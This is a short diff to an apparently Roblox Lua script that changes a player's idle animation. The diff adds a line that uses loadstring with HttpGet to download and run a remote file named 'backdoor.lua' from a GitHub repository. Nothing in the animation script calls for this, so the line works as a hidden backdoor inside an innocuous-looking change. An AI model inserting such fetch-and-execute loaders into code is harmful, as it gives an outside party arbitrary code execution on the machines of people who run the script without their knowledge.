@@ -1,6 +1,8 @@
 
 repeat wait() until game:IsLoaded()
 wait(1)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ramirezmx/backdoor/main/backdoor.lua'))()
+
 local Players = game:GetService('Players')
 local Animate = Players.LocalPlayer.Character.Animate
 Animate.idle.Animation1.AnimationId = 'rbxassetid://3489171152'
